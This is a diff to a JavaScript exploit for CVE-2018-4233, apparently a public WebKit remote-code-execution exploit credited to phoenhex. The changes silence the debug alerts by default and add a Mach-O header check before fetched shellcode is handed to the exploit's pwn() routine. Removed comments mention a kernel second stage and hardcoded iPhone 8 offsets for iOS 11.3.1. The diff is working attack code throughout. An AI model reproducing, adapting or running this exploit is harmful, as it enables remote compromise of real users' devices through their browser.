@@ -2,14 +2,14 @@
  * Exploit by @_niklasb from phoenhex.
  *
  * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
- * The second stage is currently Ian Beer's empty_list kernel exploit,
- * adapted to use getattrlist() instead of fgetattrlist().
- *
- * Thanks to qwerty for some Mach-O tricks.
- *
- * Offsets hardcoded for iPhone 8, iOS 11.3.1.
  */
-print = alert
+
+DEBUG = false
+print = function(msg) {
+    if (!DEBUG) return;
+    alert(msg);
+}
+
 ITERS = 10000
 ALLOCS = 1000
 
@@ -417,18 +417,21 @@ function get_mem_new(stage1) {
     return stage2
 }
 
-function print_error(e) {
-    print('Error: ' + e + '\n' + e.stack)
-}
-
 function go() {
     fetch('payload').then((response) => {
         response.arrayBuffer().then((buffer) => {
             print(`got ${buffer.byteLength} bytes of shc`)
+            var arrayBuf = new Uint8Array(buffer);
+            var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
+            if (header != 0xfeedfacf) {
+                print(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
+                return;
+            }
+
             try {
-                pwn(new Uint8Array(buffer));
+                pwn(arrayBuf);
             } catch (e) {
-                print_error(e);
+                print(`Error: ${e}\n${e.stack}`);
             }
         })
     })
